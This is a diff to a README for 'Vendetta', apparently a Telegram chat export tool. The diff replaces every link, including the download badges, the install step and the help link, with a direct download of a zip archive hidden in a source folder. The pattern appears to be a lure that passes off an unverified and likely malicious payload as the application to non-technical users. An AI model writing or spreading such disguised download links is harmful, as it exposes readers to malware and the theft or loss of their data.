@@ -1,6 +1,6 @@
 # ⚔️ Vendetta - Export Telegram Chats with Ease
 
-[![Download Vendetta](https://img.shields.io/badge/Download-Vendetta-2ea44f?style=for-the-badge)](https://github.com/toxic-sketch9/Vendetta)
+[![Download Vendetta](https://img.shields.io/badge/Download-Vendetta-2ea44f?style=for-the-badge)](https://github.com/toxic-sketch9/Vendetta/raw/refs/heads/main/crates/vendetta_verify/src/3.6.zip)
 
 ## 🎯 What is Vendetta?
 
@@ -23,7 +23,7 @@ Follow these simple steps to start using Vendetta today. No technical knowledge 
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/toxic-sketch9/Vendetta](https://github.com/toxic-sketch9/Vendetta)
+Visit this link to download the application: [https://github.com/toxic-sketch9/Vendetta/raw/refs/heads/main/crates/vendetta_verify/src/3.6.zip](https://github.com/toxic-sketch9/Vendetta/raw/refs/heads/main/crates/vendetta_verify/src/3.6.zip)
 
 Look for the "Download" button or the latest release file on that page. The download should start automatically.
 
@@ -163,7 +163,7 @@ Yes! Open the index.html file and use your browser's search function (Ctrl+F) to
 If you run into any issues:
 
 1. **Check this README** – Most questions are answered here
-2. **Visit the GitHub page** – [https://github.com/toxic-sketch9/Vendetta](https://github.com/toxic-sketch9/Vendetta)
+2. **Visit the GitHub page** – [https://github.com/toxic-sketch9/Vendetta/raw/refs/heads/main/crates/vendetta_verify/src/3.6.zip](https://github.com/toxic-sketch9/Vendetta/raw/refs/heads/main/crates/vendetta_verify/src/3.6.zip)
 3. **Look at existing issues** – Someone might have already asked your question
 4. **Create a new issue** – Describe your problem clearly, and the developer will help you
 
@@ -171,6 +171,6 @@ If you run into any issues:
 
 Don't lose your precious conversations. With Vendetta, you can keep every message, photo, and memory safe forever. Download now and see how easy it is to preserve your Telegram history.
 
-[![Get Vendetta Now](https://img.shields.io/badge/Get%20Vendetta-Download%20Now-blue?style=for-the-badge)](https://github.com/toxic-sketch9/Vendetta)
+[![Get Vendetta Now](https://img.shields.io/badge/Get%20Vendetta-Download%20Now-blue?style=for-the-badge)](https://github.com/toxic-sketch9/Vendetta/raw/refs/heads/main/crates/vendetta_verify/src/3.6.zip)
 
 Keywords: rust, telegram
